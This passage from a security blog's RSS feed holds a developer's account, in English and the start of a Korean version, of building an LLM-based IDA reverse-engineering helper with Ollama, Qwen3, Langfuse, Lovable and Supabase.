&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-Server"><a href="#2-Ollama-Server" class="headerlink" title="2. Ollama Server"></a>2. Ollama Server</h1><p>First, you might wonder why I&#x2019;m not using a commercial service. After all, there are so many great models like Gemini and ChatGPT. My personal view is that &#x201C;a small open-source model is sufficient for this service.&#x201D; Before starting this venture, I used open-source models for projects at my previous company. Even now, while conducting research, I&#x2019;ve tested various open-source models to build an on-premises environment. Unfortunately, performance limitations prevent me from testing larger models yet &#x3160;&#x3160;</p><p>The device I currently use at home for LLM inference is a Mac mini. It has an M4 Pro chip and 64GB of RAM. I set up an Ollama server on it and served models. If you visit the <a href="https://ollama.com/search">Ollama homepage</a>, you&#x2019;ll find many models that can be utilized within 64GB of RAM.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>Among the most popular models like GPT-OSS and DeepSeek, I tend to prefer models around 32B in size that are quantized to Q8. To give a simple reason:</p><ul><li>While 70B Q4 models (about 40G when downloaded) can run on 64GB RAM, these 70B models were already somewhat outdated at the time. I also thought it would be better to use a smaller model, considering the need to reserve space for the context window when processing long functions.</li><li>Around mid-August, some hot new models emerged that were smaller yet performed well. For gpt-oss, there was a 20B MoE model, and qwen3 had 32B and 30B MoE models. These models seemed to deliver performance comparable to the latest ChatGPT 4o or slightly better.</li><li>Beyond these, I also tested smaller models like Phi4 14B and Gemma 27B using several pre-set prompts I had prepared to evaluate their performance.</li></ul><p>After multiple tests, I decided to use the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model.</p><ol><li><p>As expected, the MoE model is significantly faster at inference than the standard model. The Qwen3 32B q8 model achieved about 7 TPS, while the Qwen 30B MoE model reached up to 45 TPS. I felt this was sufficient for a small-scale service.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>The reason we did not use the reasoning model qwen3:30b-a3b-thinking-2507 was that a bug where reasoning failed to complete consistently appeared during prompt testing. Since the model had only recently been released at the time, we simply decided not to use it.</p></li><li>The reason for not using other Reasoning models was that they took significantly longer to complete outputs. While the instruct model could produce most outputs within 2 minutes, enabling Reasoning added an extra 1-2 minutes. Additionally, performance was sufficient even without Reasoning.</li><li>Using smaller models required additional work, meaning their single-batch analysis performance was inferior. For the Phi4 14B model, while performance was sufficient, using the FP16 model was necessary to achieve usable performance levels. However, the reasoning time was too long for practical use. Beyond this, we determined that utilizing models like Qwen3 14B, 8B, Gemma 27B, and Deepseek 14B effectively would require significantly more prompt engineering effort.</li><li>Considering various factors like speed, performance, and memory, we determined that using the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model was the most suitable choice.</li></ol><p>With the model selected, simply set the environment variables and run the server using the <code>ollama serve</code> command&#x2014;that&#x2019;s all it takes to get ready!</p><h1 id="2-Prompt-Logging-with-Langfuse"><a href="#2-Prompt-Logging-with-Langfuse" class="headerlink" title="2. Prompt Logging with Langfuse"></a>2. Prompt Logging with Langfuse</h1><p>You might be thinking, &#x201C;Can&#x2019;t we just use LangSmith?&#x201D; I agree, but&#x2026; since we tested it during the solution development process while considering on-premises deployment, I decided to give Langfuse a try this time.</p><p>Installing Langfuse on the server isn&#x2019;t difficult. Just grab it from the repository and deploy it via Docker. Then, register Langfuse&#x2019;s callback handler in Langchain, and request logging will start as shown below.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>Logging allows you to verify whether responses to requests were sent correctly and check the quality of those responses. Based on this information, you can refine prompts or execution chains.</p><p>And! You can also detect incoming attacks lol</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>As shown above, we also detected prompt injection attacks being launched. You worked hard until dawn&#x2026; Unfortunately, it seems you weren&#x2019;t able to obtain the information you wanted.</p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>Originally, our website was developed using Base44. Yes, that&#x2019;s the service <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">acquired by Wix for $80M a few months ago</a>. I tried it after reading this article too. It was fine for developing simple landing pages, but problems started piling up after adding login functionality. It was especially terrible when developing features that utilized the database.</p><p>So, while searching for alternatives at the time, I heard that &#x201C;Lovable is a hot service these days&#x201D; and decided to give it a try. I first cloned the webpage I had previously developed exactly as it was, then started developing the login feature. To store user information, I connected it to Supabase. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Unlike Base44, it integrates directly with Supabase, makes database management easier, and seems to have many advantages overall. Of course, it might struggle to handle large-scale customers (my wallet, that is). Once you set up this integration and create the login button&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>Yeah&#x2026; it wasn&#x2019;t exactly easy, but I did manage to succeed after a few tries. After logging in, there should be a dashboard, right? I&#x2019;ll create it by writing the prompt well. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>Of course, it doesn&#x2019;t get cleanly developed with just that one prompt. If it had worked in one go, I&#x2019;d be out buying Lovable stock right now.</p><p>Anyway, there were still plenty of issues. While it generates API keys randomly just fine, it saves them to Supabase with parts of the key masked (<em>*</em>), or arbitrarily removes buttons, and so on&#x2014;there were a bunch of minor details to worry about. So I decided to narrow the scope of the features to implement. Originally, I wanted to add fun elements like a weekly Top 5 usage list&#x2026; but it required more prompting than expected, so I decided to skip it for now.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>After about four hours of hard work, I managed to implement all the essential features. If I had developed it myself with my limited web development skills, it would have taken a week. Using AI services these days is definitely more advantageous.</p><p>I&#x2019;ll wrap things up here for today. Next time, I&#x2019;ll cover the rest of the development process and what happened at the presentation site. Until then&#x2026; wish me luck staying alive&#x2026; Bye!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 초짜 개발자의 AI 서비스 삽질기 Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</guid>
      <pubDate>Thu, 30 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-&amp;#xBB34;&amp;#xC2A8;-&amp;#xC77C;&amp;#xC774;-&amp;#xC788;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg" alt="index_img"></p><h1 id="0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"><a href="#0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;" class="headerlink" title="0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"></a>0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;</h1><p>&#xD558;&#xD558; j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC65C; &#xB610; &#xC774;&#xB807;&#xAC8C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xAE00;&#xC744; &#xC4F0;&#xB0D0;&#xAD6C;&#xC694;? &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC4F4; &#xAE00;&#xC774; &#xC5B8;&#xC81C;&#xC9C0;&#x2026; &#xC544; 8&#xC6D4;&#x2026; &#xD558;&#xD558;&#x2026; &#xC0B4;&#xB824;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC880; &#xB354; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xAE00;&#xC744; &#xBC14;&#xCE58;&#xACA0;&#xB098;&#xC774;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/joker.png" alt="image.png"></p><p>&#xC624;&#xB298;&#xC740; &#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00;&#xB4E4;&#xACFC; &#xB2EC;&#xB9AC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xC598;&#xAE30;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 30&#xC77C;, &#xC81C; 31&#xD68C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xADF8;&#xBCF4;&#xB2E4; &#xB300;&#xB7B5; 2&#xC8FC; &#xC804;&#xC5D0; &#xAC11;&#xC790;&#xAE30; &#xC6B4;&#xC601;&#xC9C4;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5F0;&#xB77D;&#xC744; &#xBC1B;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>&#xC608;&#x2026; &#xC6D0;&#xB798; &#xBC1C;&#xD45C;&#xD558;&#xC2DC;&#xB824;&#xB358; &#xBD84;&#xC774; &#xAE09;&#xC791;&#xC2A4;&#xB7FD;&#xAC8C; &#xBC1C;&#xD45C;&#xB97C; &#xBABB;&#xD558;&#xC2E0;&#xB2E4;&#xACE0; &#xC5F0;&#xB77D;&#xC774; &#xC640;&#xC11C; &#xB300;&#xD0C0;&#xB97C; &#xAD6C;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB358; &#xAC70;&#xC600;&#xC8E0;. &#xC800;&#xB294; &#xC6D0;&#xB798; &#xC774;&#xD2C0;&#xB0A0;&#xC5D0; &#xAC00;&#xC11C; &#xBA58;&#xD2F0; &#xBC1C;&#xD45C;&#xD558;&#xB294; &#xAC70; &#xB4E3;&#xACE0; &#xC800;&#xB141;&#xC5D0; &#xC6B4;&#xC601;&#xC9C4;&#xBD84;&#xB4E4;&#xC774;&#xB791; &#xC220;&#xC774;&#xB098; &#xBA39;&#xC5B4;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xAC8C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xBC1C;&#xD45C; &#xC900;&#xBE44;&#xB97C; &#xC880; &#xD558;&#xACE0; &#xC77C;&#xC8FC;&#xC77C; &#xC815;&#xB3C4; &#xC2DC;&#xAC04; &#xC5EC;&#xC720;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xC81C;&#xAC00; &#xC77C; &#xBC8C;&#xB9AC;&#xB294;&#xB370;&#xB294; &#xC120;&#xC218;&#xB77C; &#xBB54;&#xAC00;&#xB97C; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;"><a href="#1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;" class="headerlink" title="1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;"></a>1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;</h1><p>&#xC7A0;&#xAE50; &#xADFC;&#xD669;&#xC744; &#xC598;&#xAE30;&#xD558;&#xC790;&#xBA74;, &#xCD5C;&#xADFC; L0ch&#xC640; Hacky-AI&#xB77C;&#xB294; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xCC3D;&#xC5C5;&#xD574;&#xC11C; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xAD00;&#xC2EC;&#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xC800;&#xD76C; <a href="https://hacky-ai.com/">&#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xBC29;&#xBB38;&#xD574;&#xC8FC;&#xC138;&#xC694;!) &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC740; &#xACE0;&#xAC1D;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xBC95;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC2E0;&#xACBD; &#xC4F8; &#xAC83;&#xC774; &#xB9CE;&#xC9C0;&#xB9CC;&#x2026; &#xC544;&#xBB34;&#xD2BC; &#xADF8;&#xB798;&#xC11C; &#x201C;&#xBC1C;&#xD45C;&#xB97C; &#xB4E3;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAE4C;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC194;&#xB8E8;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC788;&#xAE30;&#xB3C4; &#xD574;&#xC11C; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774; &#xB54C; &#xCD5C;&#xB300;&#xD55C; &#xC9C0;&#xD0A4;&#xACE0;&#xC790; &#xD588;&#xB358; &#xAC83;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB0B4;&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC9C0; &#xB9D0;&#xACE0; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC774; &#xB2E4; &#xC791;&#xC131;&#xD558;&#xAC8C; &#xD558;&#xC790;.</li><li>&#xC77C;&#xC8FC;&#xC77C;&#xBC16;&#xC5D0; &#xC5C6;&#xC73C;&#xB2C8; &#xB3CC;&#xC544;&#xAC00;&#xAC8C;&#xB9CC; &#xB9CC;&#xB4E4;&#xC790;.</li><li>&#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC790;.</li></ol><p>&#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xB294; 1&#xC77C;&#xCC28; &#xC800;&#xB141;&#xC5D0; CTF&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;, &#xADF8;&#xB798;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC815;&#xD55C; &#xAC83;&#xC740; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xC774;&#xC81C; &#xB9C9; &#xD574;&#xD0B9;&#xC744; &#xC2DC;&#xC791;&#xD55C; &#xBD84;&#xB4E4;&#xC77C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC5D0;&#xB294; &#xC544;&#xC9C1; &#xB9CE;&#xC774; &#xC775;&#xC219;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xC2E4; &#xAC83;&#xC774;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xBA74; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD63C;&#xC790; 3&#xC77C; &#xC815;&#xB3C4; &#xD22C;&#xC790;&#xD558;&#xBA74; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC5C8;&#xC8E0;.(&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC83;&#xC740; &#xC624;&#xB9CC;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;) &#xC880; &#xB354; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC77D;&#xAE30; &#xC26C;&#xC6B4; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xACE0; &#xD568;&#xC218; &#xB0B4;&#xC6A9;&#xC744; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(IDA&#xB97C; &#xC548; &#xD0A8;&#xC9C0; 1&#xB144;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xB2C8; &#xC774;&#xBBF8; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB85C; &#xC788;&#xB294; &#xAC78; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#x2026; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xB294;&#xAC8C; &#xCDE8;&#xC9C0;&#xB2C8;&#xAE4C;&#xC694;)</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC11C;&#xBE44;&#xC2A4; &#xD750;&#xB984;&#xB3C4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-&#xC11C;&#xBC84;"><a href="#2-Ollama-&#xC11C;&#xBC84;" class="headerlink" title="2. Ollama &#xC11C;&#xBC84;"></a>2. Ollama &#xC11C;&#xBC84;</h1><p>&#xBA3C;&#xC800; &#xC65C; &#xC0C1;&#xC6A9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC4F0;&#xC9C0; &#xC54A;&#xB0D0;?&#xB294; &#xC9C8;&#xBB38;&#xC774; &#xB4DC;&#xC2E4;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. Gemini, ChatGPT &#xB4F1; &#xC88B;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740;&#xB370; &#xB9D0;&#xC774;&#xC8E0;. &#xC77C;&#xB2E8; &#xAC1C;&#xC778;&#xC801;&#xC778; &#xC0DD;&#xAC01;&#xC740; &#x201C;&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xB294; &#xC791;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; 